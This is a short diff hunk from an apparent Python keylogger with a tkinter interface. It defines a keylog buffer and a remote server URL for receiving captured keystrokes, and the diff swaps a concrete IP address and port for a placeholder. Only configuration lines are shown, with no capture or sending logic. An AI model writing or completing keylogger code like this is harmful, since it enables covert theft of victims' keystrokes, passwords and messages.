@@ -6,7 +6,7 @@ import tkinter as tk
 from tkinter import messagebox
 
 # Remote server URL
-REMOTE_SERVER_URL = "http://51.120.1.186:5000/receive"
+REMOTE_SERVER_URL = "http://<ip>:<port>/receive"
 
 # Keylogging buffer
 keylog_buffer = []
